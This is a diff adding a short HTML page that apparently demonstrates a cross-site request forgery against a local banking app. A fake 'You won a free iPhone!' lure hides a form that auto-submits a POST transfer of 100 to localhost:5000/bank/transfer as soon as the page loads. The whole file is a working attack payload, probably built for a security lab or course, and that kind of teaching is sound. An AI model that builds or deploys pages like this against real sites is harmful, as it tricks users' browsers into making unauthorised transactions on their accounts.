@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Free Gift 🎁</title>
+</head>
+
+<body>
+  <h1>🎉 You won a free iPhone!</h1>
+  <p>Redirecting...</p>
+
+  <!-- CSRF Attack Form -->
+  <form id="attackForm" action="http://localhost:5000/bank/transfer" method="POST">
+    <input type="hidden" name="amount" value="100">
+  </form>
+
+  <script>
+    // Auto submit attack
+    document.getElementById("attackForm").submit();
+  </script>
+</body>
+</html>
